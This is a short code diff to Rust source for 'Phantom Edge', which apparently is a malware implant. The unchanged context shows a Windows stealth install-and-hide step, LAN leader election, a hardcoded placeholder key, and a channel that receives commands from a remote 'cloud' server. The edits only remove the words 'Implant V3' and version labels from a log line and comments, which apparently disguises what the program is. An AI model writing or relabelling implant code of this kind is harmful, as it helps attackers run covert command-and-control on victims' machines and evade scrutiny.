@@ -58,7 +58,7 @@ impl Deduplicator {
 #[tokio::main]
 async fn main() {
     env_logger::init();
-    info!("Phantom Edge (Implant V3) Started - LAN Clustering Mode");
+    info!("Phantom Edge Started - LAN Clustering Mode");
 
     // 0. Windows Stealth: Install & Hide (If applicable)
     #[cfg(target_os = "windows")]
@@ -100,7 +100,7 @@ async fn run_leader_mode(election: Arc<ElectionService>) {
         elec_clone.monitor_requests().await;
     });
 
-    // 1. Setup Cloud Connection (Poly-MQTT V3)
+    // 1. Setup Cloud Connection
     // Master Key (Shared Secret) - In prod use real key
     let master_key = [0x42; 32]; 
 
@@ -132,7 +132,7 @@ async fn run_leader_mode(election: Arc<ElectionService>) {
     let (ip, port) = &swarm_nodes[0];
     let client = Arc::new(PolyMqttClient::new(ip, *port, &master_key));
     
-    // Channels for V3 Client
+    // Channels for Client
     let (msg_tx, msg_rx) = mpsc::channel::<Vec<u8>>(100); // Outgoing to Cloud
     let (cmd_tx, mut cmd_rx) = mpsc::channel::<Vec<u8>>(100); // Incoming from Cloud
 
